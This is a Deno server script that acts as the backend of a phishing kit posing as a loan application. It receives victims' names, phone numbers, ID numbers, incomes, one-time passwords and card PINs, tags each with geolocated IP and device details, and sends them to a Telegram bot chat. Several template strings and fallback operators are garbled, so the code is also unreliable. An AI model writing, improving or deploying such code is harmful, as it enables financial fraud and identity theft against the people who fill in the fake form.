import { serve } from "https://deno.land/std@0.168.0/http/server.ts";

const TELEGRAM_TOKEN = Deno.env.get("TG_BOT_TOKEN");
const TELEGRAM_CHAT  = Deno.env.get("TG_CHAT_ID");

function fromHeaders(req: Request){
  const ip = req.headers.get("x-forwarded-for")?.split(",")[0].trim()
    || req.headers.get("cf-connecting-ip")
    || "unknown";
  const ua = req.headers.get("user-agent") || "unknown";
  return { ip, ua };
}

// Map UA -> device/browser (mirror of remote.js, server-side truth)
function parseUA(ua:string){
  const browser = ua.includes("Chrome")?"Chrome":ua.includes("Firefox")?"Firefox":ua.includes("Safari")?"Safari":"Unknown";
  const os = /Windows/i.test(ua)?"Windows":/Mac/i.test(ua)?"macOS":/Android/i.test(ua)?"Android":/iPhone|iPad/i.test(ua)?"iOS":"Unknown";
  const device = /Mobi|Android/i.test(ua)?"Mobile":"Desktop";
  return { browser, os, device };
}

async function geo(ip:string){
  try{
    const r = await fetch(https://ipapi.co/${ip}/json/);
    const j = await r.json();
    return { city:j.city"", region:j.region"", country:j.country_name"", isp:j.org"" };

}catch(e){ return { city:"", region:"", country:"", isp:"" }; }
}

serve(async (req) => {
  if (req.method !== "POST") return new Response("ok");
  let body:any = {};
  try{ body = await req.json(); }catch(e){}

  const { ip, ua } = fromHeaders(req);
  const dev = parseUA(ua);
  const g = await geo(ip);

  const meta:any = body.meta || {};
  const client = { ip: meta.ip"", city: meta.cityg.city, region: meta.region||g.region,
                   country: meta.countryg.country, isp: meta.ispg.isp };

  const evt = body.event || "unknown";
  const d = body.data || {};

  let header, lines:string[] = [];
  if (evt === "application"){
    header = "📋 NEW APPLICATION";
    lines = [
      👤 Name: ${d.name||"-"},
      📱 Phone: ${d.phone||"-"},
      📧 Email: ${d.email||"-"},
      🌍 Nationality: ${d.nationality||"-"},
      🪪 ID No.: ${d.id||"-"},
      💰 Amount: $${d.amount||"-"},
      💵 Monthly Income: $${d.income||"-"}
    ];
  } else if (evt === "otp"){
    header = "🔐 OTP RECEIVED";
    lines = [🔢 OTP: ${d.otp||"-"}, 💰 Amount: ${d.amount||"-"}];
  } else if (evt === "pin"){
    header = "💳 CARD PIN RECEIVED";
    lines = [🔢 PIN: ${d.pin||"-"}, 💰 Amount: ${d.amount||"-"}];
  } else {
    header = "⚠️ EVENT: "+evt;
    lines = [JSON.stringify(d)];
  }

  const text = header + "\n──────────────\n"
    + lines.join("\n") + "\n"
    + "──────────────\n"
    + 🌐 IP: ${ip} (${client.city}, ${client.region}, ${client.country})\n
    + 📡 ISP: ${client.isp||"-"}\n
    + 📱 Device: ${dev.device} (${dev.os} / ${dev.browser})\n
    + 🖥 Screen: ${meta.screen||"-"} | Lang: ${meta.lang||"-"} | TZ: ${meta.tz||"-"};

  try{
    await fetch(https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage,{
      method:"POST",headers:{"Content-Type":"application/json"},
      body:JSON.stringify({chat_id: TELEGRAM_CHAT, text: text})
    });
  }catch(e){}

  return new Response(JSON.stringify({ok:true}),{headers:{"Content-Type":"application/json"}});
});
